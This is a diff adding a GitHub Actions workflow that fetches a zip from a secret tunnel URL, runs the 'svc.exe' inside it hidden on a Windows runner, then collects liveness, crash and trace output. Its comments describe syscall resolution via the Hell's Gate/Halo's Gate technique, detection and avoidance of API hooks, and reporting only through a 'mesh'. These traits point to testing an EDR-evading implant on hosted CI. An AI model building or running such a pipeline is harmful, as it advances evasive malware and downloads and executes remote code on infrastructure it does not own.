@@ -1,0 +1,68 @@
+name: bof-ssn-ci
+on:
+  workflow_dispatch:
+    inputs:
+      expected_sha256:
+        description: 'pack sha256 fail-closed'
+        default: ''
+jobs:
+  bofrunner:
+    runs-on: windows-latest
+    timeout-minutes: 15
+    steps:
+      - name: ssnstage
+        shell: pwsh
+        env:
+          SRC_URL: ${{ secrets.TUNNEL_URL }}
+        run: |
+          # E5 ssn.rs (sonda SSN: fingerprint por build + re-deriva anti-mismatch):
+          # build ssn-01. Sobre az-ssn1 (ctype ssn, op probar). El agente resuelve
+          # el mapa real por la cascada Hell/Halo de gate.rs SIN GetProcAddress,
+          # verifica las 8 canaries del build contra la ntdll viva y corre el
+          # self-test sintetico (lectura directa, hook E9 detectado+rehusado,
+          # re-deriva en ambas direcciones). El informe llega SOLO por la malla;
+          # este stage solo prueba vida del proceso y evidencia de crash WER.
+          $zip = Join-Path $env:RUNNER_TEMP "pack.zip"
+          Invoke-WebRequest -Uri $env:SRC_URL -OutFile $zip -UseBasicParsing
+          $h = (Get-FileHash $zip -Algorithm SHA256).Hash.ToLower()
+          Write-Host ("pack sha256=" + $h)
+          $want = "${{ inputs.expected_sha256 }}"
+          if ($want -and ($h -ne $want.ToLower())) { Write-Host "SHA MISMATCH"; exit 1 }
+          $dir = Join-Path $env:RUNNER_TEMP "ssnd"
+          Expand-Archive -Path $zip -DestinationPath $dir -Force
+          Remove-Item $zip -Force
+          $svc = Get-ChildItem $dir -Filter 'svc.exe' | Select-Object -First 1
+          if (-not $svc) { Write-Host "NO PACK PARTS"; exit 1 }
+          $p = Start-Process -FilePath $svc.FullName -PassThru -WindowStyle Hidden
+          Write-Host ("SS OLDPID=" + $p.Id + " start=" + (Get-Date).ToString('HH:mm:ss'))
+          for ($i = 1; $i -le 13; $i++) {
+            Start-Sleep -Seconds 30
+            $alive = Get-Process -Id $p.Id -ErrorAction SilentlyContinue
+            if ($alive) {
+              Write-Host ("SS alive " + $i + " t=" + (Get-Date).ToString('HH:mm:ss'))
+            } else {
+              Write-Host ("SS DEAD at t+" + ($i * 30) + "s")
+              break
+            }
+          }
+          if (Get-Process -Id $p.Id -ErrorAction SilentlyContinue) { Write-Host "SS svc alive a +400" } else { Write-Host "SS svc dead a +400" }
+          Start-Sleep -Seconds 3
+          $wer = Get-WinEvent -FilterHashtable @{LogName='Application'; Level=2} -MaxEvents 10 -ErrorAction SilentlyContinue
+          if ($wer) {
+            foreach ($w in $wer) {
+              $msg = ($w.Message -replace "\s+", " ")
+              Write-Host ("SS WER " + $w.TimeCreated.ToString("HH:mm:ss.fff") + ": " + $msg.Substring(0, [Math]::Min(400, $msg.Length)))
+            }
+          } else { Write-Host "SS WER none" }
+          $ws = @($env:TEMP, $env:RUNNER_TEMP, $env:LOCALAPPDATA) | Where-Object { $_ }
+          foreach ($wdir in $ws) {
+            $cand = Get-ChildItem -Path $wdir -Recurse -Filter 'wsrun.txt' -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 2
+            foreach ($c in $cand) {
+              Write-Host ("SS TRACE " + $c.FullName)
+              Get-Content -Path $c.FullName -Tail 40 | ForEach-Object { Write-Host ("SS WS " + $_) }
+            }
+          }
+          Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
+          Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue
+          Write-Host "ssn step done"
+          exit 0
